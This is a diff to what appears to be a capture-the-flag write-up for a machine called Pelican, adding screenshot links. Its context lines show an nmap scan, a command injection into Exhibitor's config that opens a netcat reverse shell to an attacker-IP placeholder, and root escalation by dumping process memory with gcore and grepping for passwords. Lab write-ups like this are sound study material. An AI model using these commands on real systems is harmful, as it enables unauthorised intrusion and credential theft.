@@ -27,6 +27,8 @@ plaintext password sitting in that process's memory.
 sudo nmap -p- -sVC <TARGET_IP>
 ```
 
+![nmap service scan](./assets/pelican/01-nmap.png)
+
 Zookeeper's Exhibitor UI, running on port 2181, was recognized as having a
 public documented exploit.
 
@@ -43,6 +45,8 @@ the script and saving it triggered execution:
 ```
 $(/bin/nc -e /bin/sh <ATTACKER_IP> 4444 &)
 ```
+
+![injecting the reverse shell into Exhibitor's java.env config](./assets/pelican/02-exhibitor-command-injection.png)
 
 ```bash
 nc -lvnp 4444
@@ -70,6 +74,8 @@ result for readable strings recovered a plaintext root password directly:
 sudo /usr/bin/gcore <PID>
 strings core.<PID> | grep -i pass
 ```
+
+![GTFOBins entry for gcore](./assets/pelican/03-gtfobins-gcore.png)
 
 `su root` with the recovered password succeeded. Root flag retrieved.
 
